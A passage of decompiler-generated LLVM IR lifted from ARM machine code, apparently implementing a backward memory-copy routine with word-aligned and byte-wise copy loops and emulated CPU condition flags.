  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16df0

dec_label_pc_16df0:                               ; preds = %dec_label_pc_16df0.loopexit, %dec_label_pc_16dcc
  %v6_16df8 = phi i32 [ %v1_16de4, %dec_label_pc_16df0.loopexit ], [ %v0_16ddc37, %dec_label_pc_16dcc ]
  %v0_16e00.pr = phi i32 [ %v2_16de8, %dec_label_pc_16df0.loopexit ], [ %v2_16dd0, %dec_label_pc_16dcc ]
  %v4_16df0 = add i32 %v0_16e00.pr, 16
  %v6_16df0 = sub i32 0, %v0_16e00.pr
  %v7_16df0 = and i32 %v4_16df0, %v6_16df0
  %v8_16df0 = icmp slt i32 %v7_16df0, 0
  store i1 %v8_16df0, i1* %cpsr_v.global-to-local, align 1
  %v9_16df0 = icmp slt i32 %v4_16df0, 0
  store i1 %v9_16df0, i1* %cpsr_n.global-to-local, align 1
  %v10_16df0 = icmp eq i32 %v4_16df0, 0
  store i1 %v10_16df0, i1* %cpsr_z.global-to-local, align 1
  %v5_16df4 = icmp slt i32 %v0_16e00.pr, -16
  br i1 %v5_16df4, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_16df0
  %v6_16df4 = load i32, i32* %r1.global-to-local, align 4
  %v7_16df4 = add i32 %v6_16df4, -4
  %v8_16df4 = inttoptr i32 %v7_16df4 to i32*
  %v9_16df4 = load i32, i32* %v8_16df4, align 4
  store i32 %v9_16df4, i32* @r3, align 4
  %v10_16df4 = add i32 %v6_16df4, -8
  %v11_16df4 = inttoptr i32 %v10_16df4 to i32*
  %v12_16df4 = load i32, i32* %v11_16df4, align 4
  store i32 %v12_16df4, i32* %r4.global-to-local, align 4
  %v13_16df4 = add i32 %v6_16df4, -12
  %v14_16df4 = inttoptr i32 %v13_16df4 to i32*
  %v15_16df4 = load i32, i32* %v14_16df4, align 4
  store i32 %v15_16df4, i32* @ip, align 4
  %v16_16df4 = add i32 %v6_16df4, -16
  %v17_16df4 = inttoptr i32 %v16_16df4 to i32*
  %v18_16df4 = load i32, i32* %v17_16df4, align 4
  store i32 %v18_16df4, i32* %lr.global-to-local, align 4
  store i32 %v16_16df4, i32* %r1.global-to-local, align 4
  %v7_16df8 = add i32 %v6_16df8, -16
  %v8_16df8 = inttoptr i32 %v7_16df8 to i32*
  store i32 %v9_16df4, i32* %v8_16df8, align 4
  %v10_16df8 = add i32 %v6_16df8, -12
  %v11_16df8 = inttoptr i32 %v10_16df8 to i32*
  %v12_16df8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_16df8, i32* %v11_16df8, align 4
  %v13_16df8 = add i32 %v6_16df8, -8
  %v14_16df8 = inttoptr i32 %v13_16df8 to i32*
  %v15_16df8 = load i32, i32* @ip, align 4
  store i32 %v15_16df8, i32* %v14_16df8, align 4
  %v16_16df8 = add i32 %v6_16df8, -4
  %v17_16df8 = inttoptr i32 %v16_16df8 to i32*
  %v18_16df8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_16df8, i32* %v17_16df8, align 4
  store i32 %v7_16df8, i32* %r0.global-to-local, align 4
  %v6_16dfc = load i32, i32* %r2.global-to-local, align 4
  %v7_16dfc = add i32 %v6_16dfc, -16
  store i32 %v7_16dfc, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16df0, %bb147
  %v6_16e08 = phi i32 [ %v7_16df8, %bb147 ], [ %v6_16df8, %dec_label_pc_16df0 ]
  %v0_16e00 = phi i32 [ %v7_16dfc, %bb147 ], [ %v0_16e00.pr, %dec_label_pc_16df0 ]
  %v4_16e00 = add i32 %v0_16e00, 20
  store i32 %v4_16e00, i32* %r2.global-to-local, align 4
  %v6_16e00 = sub i32 0, %v0_16e00
  %v7_16e00 = and i32 %v4_16e00, %v6_16e00
  %v8_16e00 = icmp slt i32 %v7_16e00, 0
  store i1 %v8_16e00, i1* %cpsr_v.global-to-local, align 1
  %v9_16e00 = icmp slt i32 %v4_16e00, 0
  store i1 %v9_16e00, i1* %cpsr_n.global-to-local, align 1
  %v10_16e00 = icmp eq i32 %v4_16e00, 0
  store i1 %v10_16e00, i1* %cpsr_z.global-to-local, align 1
  %v5_16e04 = icmp slt i32 %v0_16e00, -20
  br i1 %v5_16e04, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_16e04 = load i32, i32* %r1.global-to-local, align 4
  %v7_16e04 = add i32 %v6_16e04, -4
  %v8_16e04 = inttoptr i32 %v7_16e04 to i32*
  %v9_16e04 = load i32, i32* %v8_16e04, align 4
  store i32 %v9_16e04, i32* @r3, align 4
  %v10_16e04 = add i32 %v6_16e04, -8
  %v11_16e04 = inttoptr i32 %v10_16e04 to i32*
  %v12_16e04 = load i32, i32* %v11_16e04, align 4
  store i32 %v12_16e04, i32* @ip, align 4
  %v13_16e04 = add i32 %v6_16e04, -12
  %v14_16e04 = inttoptr i32 %v13_16e04 to i32*
  %v15_16e04 = load i32, i32* %v14_16e04, align 4
  store i32 %v15_16e04, i32* %lr.global-to-local, align 4
  store i32 %v13_16e04, i32* %r1.global-to-local, align 4
  %v7_16e08 = add i32 %v6_16e08, -12
  %v8_16e08 = inttoptr i32 %v7_16e08 to i32*
  store i32 %v9_16e04, i32* %v8_16e08, align 4
  %v10_16e08 = add i32 %v6_16e08, -8
  %v11_16e08 = inttoptr i32 %v10_16e08 to i32*
  %v12_16e08 = load i32, i32* @ip, align 4
  store i32 %v12_16e08, i32* %v11_16e08, align 4
  %v13_16e08 = add i32 %v6_16e08, -4
  %v14_16e08 = inttoptr i32 %v13_16e08 to i32*
  %v15_16e08 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_16e08, i32* %v14_16e08, align 4
  store i32 %v7_16e08, i32* %r0.global-to-local, align 4
  %v6_16e0c = load i32, i32* %r2.global-to-local, align 4
  %v7_16e0c = add i32 %v6_16e0c, -12
  store i32 %v7_16e0c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_16e2c45 = phi i32 [ %v6_16e08, %.thread2 ], [ %v7_16e08, %bb148 ]
  %v0_16e1443 = phi i32 [ %v4_16e00, %.thread2 ], [ %v7_16e0c, %bb148 ]
  %v2_16e10 = load i8*, i8** %stack_var_-8, align 4
  %v3_16e10 = ptrtoint i8* %v2_16e10 to i32
  store i32 %v3_16e10, i32* @r4, align 4
  store i32 %v8_16dcc, i32* @lr, align 4
  br label %dec_label_pc_16e14

dec_label_pc_16e14:                               ; preds = %dec_label_pc_16dc4, %.thread4
  %v7_16e24 = phi i32 [ %v0_16ddc37, %dec_label_pc_16dc4 ], [ %v6_16e2c45, %.thread4 ]
  %v0_16e14 = phi i32 [ %v2_16dc4, %dec_label_pc_16dc4 ], [ %v0_16e1443, %.thread4 ]
  %v2_16e14 = add i32 %v0_16e14, 8
  store i32 %v2_16e14, i32* %r2.global-to-local, align 4
  %v4_16e14 = sub i32 0, %v0_16e14
  %v5_16e14 = and i32 %v2_16e14, %v4_16e14
  %v6_16e14 = icmp slt i32 %v5_16e14, 0
  store i1 %v6_16e14, i1* %cpsr_v.global-to-local, align 1
  %v7_16e14 = icmp slt i32 %v2_16e14, 0
  store i1 %v7_16e14, i1* %cpsr_n.global-to-local, align 1
  %v8_16e14 = icmp eq i32 %v2_16e14, 0
  store i1 %v8_16e14, i1* %cpsr_z.global-to-local, align 1
  %v5_16e18 = icmp slt i32 %v0_16e14, -8
  br i1 %v5_16e18, label %bb150, label %dec_label_pc_16e1c

dec_label_pc_16e1c:                               ; preds = %dec_label_pc_16e14
  %v6_16e1c = add i32 %v0_16e14, 4
  store i32 %v6_16e1c, i32* %r2.global-to-local, align 4
  %v8_16e1c = sub i32 -5, %v0_16e14
  %v9_16e1c = and i32 %v8_16e1c, %v2_16e14
  %v10_16e1c = icmp slt i32 %v9_16e1c, 0
  store i1 %v10_16e1c, i1* %cpsr_v.global-to-local, align 1
  %v11_16e1c = icmp slt i32 %v6_16e1c, 0
  store i1 %v11_16e1c, i1* %cpsr_n.global-to-local, align 1
  %v12_16e1c = icmp eq i32 %v2_16e14, 4
  store i1 %v12_16e1c, i1* %cpsr_z.global-to-local, align 1
  %v5_16e20 = icmp slt i32 %v2_16e14, 4
  %v6_16e20 = load i32, i32* %r1.global-to-local, align 4
  %v7_16e20 = add i32 %v6_16e20, -4
  %v8_16e20 = inttoptr i32 %v7_16e20 to i32*
  %v9_16e20 = load i32, i32* %v8_16e20, align 4
  store i32 %v9_16e20, i32* @r3, align 4
  br i1 %v5_16e20, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_16e1c
  store i32 %v7_16e20, i32* %r1.global-to-local, align 4
  %v8_16e24 = add i32 %v7_16e24, -4
  %v9_16e24 = inttoptr i32 %v8_16e24 to i32*
  store i32 %v9_16e20, i32* %v9_16e24, align 4
  %v10_16e24 = load i32, i32* %r0.global-to-local, align 4
  %v11_16e24 = add i32 %v10_16e24, -4
  store i32 %v11_16e24, i32* %r0.global-to-local, align 4
  %v0_16e34.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_16e1c
  %v10_16e28 = add i32 %v6_16e20, -8
  %v11_16e28 = inttoptr i32 %v10_16e28 to i32*
  %v12_16e28 = load i32, i32* %v11_16e28, align 4
  store i32 %v12_16e28, i32* @ip, align 4
  store i32 %v10_16e28, i32* %r1.global-to-local, align 4
  %v7_16e2c = add i32 %v7_16e24, -8
  %v8_16e2c = inttoptr i32 %v7_16e2c to i32*
  store i32 %v9_16e20, i32* %v8_16e2c, align 4
  %v10_16e2c = add i32 %v7_16e24, -4
  %v11_16e2c = inttoptr i32 %v10_16e2c to i32*
  %v12_16e2c = load i32, i32* @ip, align 4
  store i32 %v12_16e2c, i32* %v11_16e2c, align 4
  store i32 %v7_16e2c, i32* %r0.global-to-local, align 4
  %v6_16e30 = load i32, i32* %r2.global-to-local, align 4
  %v7_16e30 = add i32 %v6_16e30, -4
  store i32 %v7_16e30, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_16e14, %dec_label_pc_16da4, %dec_label_pc_16fd8, %dec_label_pc_16f6c, %dec_label_pc_16f00, %bb149
  %v2_16e38 = phi i32 [ %v11_16e24, %.thread8 ], [ %v0_16ed020, %.thread14 ], [ %v7_16e24, %dec_label_pc_16e14 ], [ %v2_16da8, %dec_label_pc_16da4 ], [ %v2_16e4453, %dec_label_pc_16fd8 ], [ %v2_16e4452, %dec_label_pc_16f6c ], [ %v2_16e4451, %dec_label_pc_16f00 ], [ %v7_16e2c, %bb149 ]
  %v0_16e34 = phi i32 [ %v0_16e34.pre, %.thread8 ], [ %v2_16e78, %.thread14 ], [ %v2_16e14, %dec_label_pc_16e14 ], [ %v2_16dac, %dec_label_pc_16da4 ], [ %v0_16e3449, %dec_label_pc_16fd8 ], [ %v0_16e3448, %dec_label_pc_16f6c ], [ %v0_16e3447, %dec_label_pc_16f00 ], [ %v7_16e30, %bb149 ]
  %v1_16e34 = add i32 %v0_16e34, 4
  store i32 %v1_16e34, i32* %r2.global-to-local, align 4
  %v3_16e34 = sub i32 0, %v0_16e34
  %v4_16e34 = and i32 %v1_16e34, %v3_16e34
  %v5_16e34 = icmp slt i32 %v4_16e34, 0
  store i1 %v5_16e34, i1* %cpsr_v.global-to-local, align 1
  %v6_16e34 = icmp slt i32 %v1_16e34, 0
  store i1 %v6_16e34, i1* %cpsr_n.global-to-local, align 1
  %v7_16e34 = icmp eq i32 %v1_16e34, 0
  store i1 %v7_16e34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16e34, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_16e3c = add i32 %v0_16e34, 2
  %v3_16e3c = sub i32 -3, %v0_16e34
  %v4_16e3c = and i32 %v3_16e3c, %v1_16e34
  %v5_16e3c = icmp slt i32 %v4_16e3c, 0
  store i1 %v5_16e3c, i1* %cpsr_v.global-to-local, align 1
  %v6_16e3c = icmp slt i32 %v1_16e3c, 0
  store i1 %v6_16e3c, i1* %cpsr_n.global-to-local, align 1
  %v7_16e3c = icmp eq i32 %v1_16e34, 2
  store i1 %v7_16e3c, i1* %cpsr_z.global-to-local, align 1
  %v0_16e40 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e40 = add i32 %v0_16e40, -1
  %v2_16e40 = inttoptr i32 %v1_16e40 to i8*
  %v3_16e40 = load i8, i8* %v2_16e40, align 1
  %v4_16e40 = zext i8 %v3_16e40 to i32
  store i32 %v4_16e40, i32* @r3, align 4
  store i32 %v1_16e40, i32* %r1.global-to-local, align 4
  %v3_16e44 = add i32 %v2_16e38, -1
  %v4_16e44 = inttoptr i32 %v3_16e44 to i8*
  store i8 %v3_16e40, i8* %v4_16e44, align 1
  %v5_16e44 = load i32, i32* %r0.global-to-local, align 4
  %v6_16e44 = add i32 %v5_16e44, -1
  store i32 %v6_16e44, i32* %r0.global-to-local, align 4
  %v0_16e48 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16e48 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16e48 = xor i1 %v0_16e48, %v1_16e48
  br i1 %v2_16e48, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_16e48 = load i32, i32* %r1.global-to-local, align 4
  %v4_16e48 = add i32 %v3_16e48, -1
  %v5_16e48 = inttoptr i32 %v4_16e48 to i8*
  %v6_16e48 = load i8, i8* %v5_16e48, align 1
  %v7_16e48 = zext i8 %v6_16e48 to i32
  store i32 %v7_16e48, i32* @r3, align 4
  store i32 %v4_16e48, i32* %r1.global-to-local, align 4
  %v6_16e4c = add i32 %v5_16e44, -2
  %v7_16e4c = inttoptr i32 %v6_16e4c to i8*
  store i8 %v6_16e48, i8* %v7_16e4c, align 1
  %v8_16e4c = load i32, i32* %r0.global-to-local, align 4
  %v9_16e4c = add i32 %v8_16e4c, -1
  store i32 %v9_16e4c, i32* %r0.global-to-local, align 4
  %v1_16e50.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16e50.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_16e54 = phi i32 [ %v9_16e4c, %bb152 ], [ %v6_16e44, %bb151 ]
  %v2_16e54 = phi i1 [ %v2_16e50.pre, %bb152 ], [ %v1_16e48, %bb151 ]
  %v1_16e54 = phi i1 [ %v1_16e50.pre, %bb152 ], [ %v0_16e48, %bb151 ]
  %v0_16e50 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16e50 = xor i1 %v2_16e54, %v1_16e54
  %v4_16e50 = or i1 %v0_16e50, %v3_16e50
  br i1 %v4_16e50, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_16e50 = load i32, i32* %r1.global-to-local, align 4
  %v6_16e50 = add i32 %v5_16e50, -1
  %v7_16e50 = inttoptr i32 %v6_16e50 to i8*
  %v8_16e50 = load i8, i8* %v7_16e50, align 1
  %v9_16e50 = zext i8 %v8_16e50 to i32
  store i32 %v9_16e50, i32* @r3, align 4
  store i32 %v6_16e50, i32* %r1.global-to-local, align 4
  %v8_16e54 = add i32 %v7_16e54, -1
  %v9_16e54 = inttoptr i32 %v8_16e54 to i8*
  store i8 %v8_16e50, i8* %v9_16e54, align 1
  %v10_16e54 = load i32, i32* %r0.global-to-local, align 4
  %v11_16e54 = add i32 %v10_16e54, -1
  store i32 %v11_16e54, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_16e5c:                               ; preds = %dec_label_pc_16db4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_16e5c = icmp eq i32 %v1_16db4, 1
  store i1 %v8_16e5c, i1* %cpsr_n.global-to-local, align 1
  %v9_16e5c = icmp eq i32 %v1_16db4, 2
  store i1 %v9_16e5c, i1* %cpsr_z.global-to-local, align 1
  %v1_16e60 = add i32 %v2_16da4, -1
  %v2_16e60 = inttoptr i32 %v1_16e60 to i8*
  %v3_16e60 = load i8, i8* %v2_16e60, align 1
  %v4_16e60 = zext i8 %v3_16e60 to i32
  store i32 %v4_16e60, i32* @r3, align 4
  store i32 %v1_16e60, i32* %r1.global-to-local, align 4
  %v3_16e64 = add i32 %v2_16da8, -1
  %v4_16e64 = inttoptr i32 %v3_16e64 to i8*
  store i8 %v3_16e60, i8* %v4_16e64, align 1
  %v5_16e64 = load i32, i32* %r0.global-to-local, align 4
  %v6_16e64 = add i32 %v5_16e64, -1
  store i32 %v6_16e64, i32* %r0.global-to-local, align 4
  br i1 %v8_16e5c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_16e5c
  %v6_16e68 = load i32, i32* %r1.global-to-local, align 4
  %v7_16e68 = add i32 %v6_16e68, -1
  %v8_16e68 = inttoptr i32 %v7_16e68 to i8*
  %v9_16e68 = load i8, i8* %v8_16e68, align 1
  %v10_16e68 = zext i8 %v9_16e68 to i32
  store i32 %v10_16e68, i32* @r3, align 4
  store i32 %v7_16e68, i32* %r1.global-to-local, align 4
  %v9_16e6c = add i32 %v5_16e64, -2
  %v10_16e6c = inttoptr i32 %v9_16e6c to i8*
  store i8 %v9_16e68, i8* %v10_16e6c, align 1
  %v11_16e6c = load i32, i32* %r0.global-to-local, align 4
  %v12_16e6c = add i32 %v11_16e6c, -1
  store i32 %v12_16e6c, i32* %r0.global-to-local, align 4
  br i1 %v9_16e5c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_16e70 = load i32, i32* %r1.global-to-local, align 4
  %v9_16e70 = add i32 %v8_16e70, -1
  %v10_16e70 = inttoptr i32 %v9_16e70 to i8*
  %v11_16e70 = load i8, i8* %v10_16e70, align 1
  %v12_16e70 = zext i8 %v11_16e70 to i32
  store i32 %v12_16e70, i32* @r3, align 4
  store i32 %v9_16e70, i32* %r1.global-to-local, align 4
  %v11_16e74 = add i32 %v11_16e6c, -2
  %v12_16e74 = inttoptr i32 %v11_16e74 to i8*
  store i8 %v11_16e70, i8* %v12_16e74, align 1
  %v13_16e74 = load i32, i32* %r0.global-to-local, align 4
  %v14_16e74 = add i32 %v13_16e74, -1
  store i32 %v14_16e74, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_16e5c, %bb155
  %v0_16ed020 = phi i32 [ %v12_16e6c, %bb154 ], [ %v6_16e64, %dec_label_pc_16e5c ], [ %v14_16e74, %bb155 ]
  %v0_16e78 = load i32, i32* %r2.global-to-local, align 4
  %v1_16e78 = load i32, i32* @ip, align 4
  %v2_16e78 = sub i32 %v0_16e78, %v1_16e78
  store i32 %v2_16e78, i32* %r2.global-to-local, align 4
  %v4_16e78 = xor i32 %v1_16e78, %v0_16e78
  %v5_16e78 = xor i32 %v2_16e78, %v0_16e78
  %v6_16e78 = and i32 %v5_16e78, %v4_16e78
  %v7_16e78 = icmp slt i32 %v6_16e78, 0
  store i1 %v7_16e78, i1* %cpsr_v.global-to-local, align 1
  %v8_16e78 = icmp slt i32 %v2_16e78, 0
  store i1 %v8_16e78, i1* %cpsr_n.global-to-local, align 1
  %v9_16e78 = icmp eq i32 %v0_16e78, %v1_16e78
  store i1 %v9_16e78, i1* %cpsr_z.global-to-local, align 1
  %v5_16e7c = icmp slt i32 %v0_16e78, %v1_16e78
  br i1 %v5_16e7c, label %bb150, label %dec_label_pc_16e80

dec_label_pc_16e80:                               ; preds = %.thread14
  %v0_16e80 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e80 = urem i32 %v0_16e80, 4
  store i32 %v1_16e80, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16e80 = icmp eq i32 %v1_16e80, 0
  store i1 %v2_16e80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16e80, label %dec_label_pc_16dc4, label %dec_label_pc_16e88

dec_label_pc_16e88:                               ; preds = %dec_label_pc_16dbc, %dec_label_pc_16e80
  %v0_16ed019 = phi i32 [ %v2_16da8, %dec_label_pc_16dbc ], [ %v0_16ed020, %dec_label_pc_16e80 ]
  %v0_16f7c = phi i32 [ %v2_16dac, %dec_label_pc_16dbc ], [ %v2_16e78, %dec_label_pc_16e80 ]
  %v0_16e88 = phi i32 [ %v2_16da4, %dec_label_pc_16dbc ], [ %v0_16e80, %dec_label_pc_16e80 ]
  %v0_16e90 = phi i32 [ %v1_16dbc, %dec_label_pc_16dbc ], [ %v1_16e80, %dec_label_pc_16e80 ]
  %v1_16e88 = and i32 %v0_16e88, -4
  store i32 %v1_16e88, i32* %r1.global-to-local, align 4
  %v1_16e8c = inttoptr i32 %v1_16e88 to i32*
  %v2_16e8c = load i32, i32* %v1_16e8c, align 4
  store i32 %v2_16e8c, i32* @r3, align 4
  %v7_16e90 = icmp ult i32 %v0_16e90, 2
  %v2_16f74 = add i32 %v0_16f7c, -12
  %v4_16f74 = sub i32 11, %v0_16f7c
  %v5_16f74 = and i32 %v4_16f74, %v0_16f7c
  %v6_16f74 = icmp slt i32 %v5_16f74, 0
  store i1 %v6_16f74, i1* %cpsr_v.global-to-local, align 1
  %v7_16f74 = icmp slt i32 %v2_16f74, 0
  store i1 %v7_16f74, i1* %cpsr_n.global-to-local, align 1
  %v8_16f74 = icmp eq i32 %v0_16f7c, 12
  store i1 %v8_16f74, i1* %cpsr_z.global-to-local, align 1
  %v5_16f78 = icmp slt i32 %v0_16f7c, 12
  br i1 %v7_16e90, label %dec_label_pc_16f74, label %dec_label_pc_16e98

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16e88
  %v8_16e90 = icmp eq i32 %v0_16e90, 2
  br i1 %v8_16e90, label %dec_label_pc_16f08, label %dec_label_pc_16e9c

dec_label_pc_16e9c:                               ; preds = %dec_label_pc_16e98
  br i1 %v5_16f78, label %dec_label_pc_16ee8, label %dec_label_pc_16ea4

dec_label_pc_16ea4:                               ; preds = %dec_label_pc_16e9c
  store i32 %v2_16f74, i32* %r2.global-to-local, align 4
  %v3_16ea8 = load i32, i32* @r4, align 4
  store i32 %v3_16ea8, i32* %stack_var_-12, align 4
  %v6_16ea8 = load i32, i32* @r5, align 4
  %v8_16ea8 = inttoptr i32 %v6_16ea8 to i8*
  store i8* %v8_16ea8, i8** %stack_var_-8, align 4
  %v11_16ea8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16eac

dec_label_pc_16eac:                               ; preds = %dec_label_pc_16eac.dec_label_pc_16eac_crit_edge, %dec_label_pc_16ea4
  %v0_16ed0 = phi i32 [ %v1_16ed0, %dec_label_pc_16eac.dec_label_pc_16eac_crit_edge ], [ %v0_16ed019, %dec_label_pc_16ea4 ]
  %v0_16eb0 = phi i32 [ %v0_16eb0.pre, %dec_label_pc_16eac.dec_label_pc_16eac_crit_edge ], [ %v1_16e88, %dec_label_pc_16ea4 ]
  %v0_16eac = phi i32 [ %v0_16eac.pre, %dec_label_pc_16eac.dec_label_pc_16eac_crit_edge ], [ %v2_16e8c, %dec_label_pc_16ea4 ]
  %v3_16eac = mul i32 %v0_16eac, 256
  store i32 %v3_16eac, i32* %lr.global-to-local, align 4
  %v1_16eb0 = add i32 %v0_16eb0, -4
  %v2_16eb0 = inttoptr i32 %v1_16eb0 to i32*
  %v3_16eb0 = load i32, i32* %v2_16eb0, align 4
  store i32 %v3_16eb0, i32* @r3, align 4
  %v4_16eb0 = add i32 %v0_16eb0, -8
  %v5_16eb0 = inttoptr i32 %v4_16eb0 to i32*
  %v6_16eb0 = load i32, i32* %v5_16eb0, align 4
  store i32 %v6_16eb0, i32* %r4.global-to-local, align 4
  %v7_16eb0 = add i32 %v0_16eb0, -12
  %v8_16eb0 = inttoptr i32 %v7_16eb0 to i32*
  %v9_16eb0 = load i32, i32* %v8_16eb0, align 4
  store i32 %v9_16eb0, i32* %r5.global-to-local, align 4
  %v10_16eb0 = add i32 %v0_16eb0, -16
  %v11_16eb0 = inttoptr i32 %v10_16eb0 to i32*
  %v12_16eb0 = load i32, i32* %v11_16eb0, align 4
  store i32 %v10_16eb0, i32* %r1.global-to-local, align 4
  %v4_16eb4 = udiv i32 %v12_16eb0, 16777216
  %v5_16eb4 = or i32 %v4_16eb4, %v3_16eac
  store i32 %v5_16eb4, i32* %lr.global-to-local, align 4
  %v3_16eb8 = mul i32 %v12_16eb0, 256
  %v4_16ebc = udiv i32 %v9_16eb0, 16777216
  %v5_16ebc = or i32 %v3_16eb8, %v4_16ebc
  store i32 %v5_16ebc, i32* @ip, align 4
  %v3_16ec0 = mul i32 %v9_16eb0, 256
  %v4_16ec4 = udiv i32 %v6_16eb0, 16777216
  %v5_16ec4 = or i32 %v3_16ec0, %v4_16ec4
  store i32 %v5_16ec4, i32* %r5.global-to-local, align 4
  %v3_16ec8 = mul i32 %v6_16eb0, 256
  %v4_16ecc = udiv i32 %v3_16eb0, 16777216
  %v5_16ecc = or i32 %v3_16ec8, %v4_16ecc
  store i32 %v5_16ecc, i32* %r4.global-to-local, align 4
  %v1_16ed0 = add i32 %v0_16ed0, -16
  %v2_16ed0 = inttoptr i32 %v1_16ed0 to i32*
  store i32 %v5_16ecc, i32* %v2_16ed0, align 4
  %v4_16ed0 = add i32 %v0_16ed0, -12
  %v5_16ed0 = inttoptr i32 %v4_16ed0 to i32*
  %v6_16ed0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16ed0, i32* %v5_16ed0, align 4
  %v7_16ed0 = add i32 %v0_16ed0, -8
  %v8_16ed0 = inttoptr i32 %v7_16ed0 to i32*
  %v9_16ed0 = load i32, i32* @ip, align 4
  store i32 %v9_16ed0, i32* %v8_16ed0, align 4
  %v10_16ed0 = add i32 %v0_16ed0, -4
  %v11_16ed0 = inttoptr i32 %v10_16ed0 to i32*
  %v12_16ed0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16ed0, i32* %v11_16ed0, align 4
  store i32 %v1_16ed0, i32* %r0.global-to-local, align 4
  %v0_16ed4 = load i32, i32* %r2.global-to-local, align 4
  %v2_16ed4 = add i32 %v0_16ed4, -16
  store i32 %v2_16ed4, i32* %r2.global-to-local, align 4
  %v6_16ed8 = icmp slt i32 %v0_16ed4, 16
  br i1 %v6_16ed8, label %dec_label_pc_16edc, label %dec_label_pc_16eac.dec_label_pc_16eac_crit_edge

dec_label_pc_16eac.dec_label_pc_16eac_crit_edge:  ; preds = %dec_label_pc_16eac
  %v0_16eac.pre = load i32, i32* @r3, align 4
  %v0_16eb0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16eac

dec_label_pc_16edc:                               ; preds = %dec_label_pc_16eac
  %v2_16edc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16edc, i32* @r4, align 4
  %v5_16edc = load i8*, i8** %stack_var_-8, align 4
  %v6_16edc = ptrtoint i8* %v5_16edc to i32
  store i32 %v6_16edc, i32* @r5, align 4
  store i32 %v11_16ea8, i32* @lr, align 4
  %v2_16ee0 = add i32 %v0_16ed4, -4
  store i32 %v2_16ee0, i32* %r2.global-to-local, align 4
  %v4_16ee0 = add i32 %v0_16ed4, 2147483632
  %v5_16ee0 = and i32 %v2_16ee0, %v4_16ee0
  %v6_16ee0 = icmp slt i32 %v5_16ee0, 0
  store i1 %v6_16ee0, i1* %cpsr_v.global-to-local, align 1
  %v7_16ee0 = icmp slt i32 %v2_16ee0, 0
  store i1 %v7_16ee0, i1* %cpsr_n.global-to-local, align 1
  %v8_16ee0 = icmp eq i32 %v2_16ee0, 0
  store i1 %v8_16ee0, i1* %cpsr_z.global-to-local, align 1
  %v5_16ee4 = icmp slt i32 %v2_16ed4, -12
  br i1 %v5_16ee4, label %dec_label_pc_16f00, label %dec_label_pc_16ee8

dec_label_pc_16ee8:                               ; preds = %dec_label_pc_16edc, %dec_label_pc_16e9c, %dec_label_pc_16ee8
  %v1_16ef4 = phi i32 [ %v5_16ef4, %dec_label_pc_16ee8 ], [ %v1_16ed0, %dec_label_pc_16edc ], [ %v0_16ed019, %dec_label_pc_16e9c ]
  %v0_16ee8 = load i32, i32* @r3, align 4
  %v3_16ee8 = mul i32 %v0_16ee8, 256
  store i32 %v3_16ee8, i32* %ip.global-to-local, align 4
  %v0_16eec = load i32, i32* %r1.global-to-local, align 4
  %v1_16eec = add i32 %v0_16eec, -4
  %v2_16eec = inttoptr i32 %v1_16eec to i32*
  %v3_16eec = load i32, i32* %v2_16eec, align 4
  store i32 %v3_16eec, i32* @r3, align 4
  store i32 %v1_16eec, i32* %r1.global-to-local, align 4
  %v4_16ef0 = udiv i32 %v3_16eec, 16777216
  %v5_16ef0 = or i32 %v4_16ef0, %v3_16ee8
  store i32 %v5_16ef0, i32* @ip, align 4
  %v2_16ef4 = add i32 %v1_16ef4, -4
  %v3_16ef4 = inttoptr i32 %v2_16ef4 to i32*
  store i32 %v5_16ef0, i32* %v3_16ef4, align 4
  %v4_16ef4 = load i32, i32* %r0.global-to-local, align 4
  %v5_16ef4 = add i32 %v4_16ef4, -4
  store i32 %v5_16ef4, i32* %r0.global-to-local, align 4
  %v0_16ef8 = load i32, i32* %r2.global-to-local, align 4
  %v2_16ef8 = add i32 %v0_16ef8, -4
  store i32 %v2_16ef8, i32* %r2.global-to-local, align 4
  %v6_16efc = icmp slt i32 %v0_16ef8, 4
  br i1 %v6_16efc, label %dec_label_pc_16f00.loopexit, label %dec_label_pc_16ee8

dec_label_pc_16f00.loopexit:                      ; preds = %dec_label_pc_16ee8
  %v4_16ef8 = sub i32 3, %v0_16ef8
  %v5_16ef8 = and i32 %v4_16ef8, %v0_16ef8
  %v6_16ef8 = icmp slt i32 %v5_16ef8, 0
  %v7_16ef8 = icmp slt i32 %v2_16ef8, 0
